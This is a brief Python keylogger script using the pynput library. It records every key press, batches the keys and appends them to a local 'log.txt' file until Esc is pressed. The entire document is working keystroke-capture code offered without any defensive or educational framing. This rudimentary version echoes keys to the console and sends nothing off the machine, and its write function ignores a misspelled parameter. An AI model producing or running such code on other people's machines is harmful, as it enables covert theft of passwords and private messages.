# pip install pynput
# import pynput
from pynput.keyboard import Key, Listener


log_file = "log.txt"
count = 0
keys = []


def write_file(lpg_file, keys):
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("Key") == -1:  # dont write Key.alt, Key.ctrl e.g.
                f.write(k)
        # f.write("\n")


def on_press(key):
    global keys, count
    if count >= 10:
        write_file(log_file, keys)
        keys.clear()
        count = 0
    if key == Key.esc:
        return
    if key == Key.space:
        key = "' '"
    if key == Key.enter:
        key = "\n"
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))


def on_release(key):
    if key == Key.esc:
        keys.append("\n")
        write_file(log_file, keys)
        # print("{0} symmols".format(count))
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
